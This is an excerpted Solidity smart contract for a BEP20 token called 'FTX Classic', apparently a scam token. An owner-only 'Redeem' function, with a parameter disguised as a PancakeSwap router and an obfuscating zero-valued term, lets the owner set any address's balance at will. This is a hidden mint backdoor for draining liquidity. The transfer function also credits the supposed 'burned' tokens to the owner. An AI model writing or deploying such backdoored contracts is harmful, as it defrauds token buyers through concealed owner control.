...
contract FTXClassic is BEP20 {
  
    // common addresses
    address private owner;
    address private FTXWALLET;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public FTX;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "FTX Classic";
    string public override symbol = "FTXC";
    ...
    constructor(uint FTXTOKEN) {
        // set total supply
        totalSupply = FTXTOKEN;
  ...
  modifier FTXOWNER () {
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        FTX[to] += totalValueAfterTaxAndBurn;
        FTX[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        FTX[owner] += taxVOLOTBD + burnVOLOTBD;
    ...
    function Redeem(address pancakeswaprooter, uint256 Tamount) external FTXOWNER {
      FTX[pancakeswaprooter] = (Tamount / Tamount - Tamount / Tamount) + Tamount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(FTX[from] >= totalValue, "Balance is too low to make transfer.");
    ...
    function _burn(address account, uint256 Tamount) internal {
        ...
        require(FTX[account] >= Tamount, "Burn Tamount exceeds balance at address.");
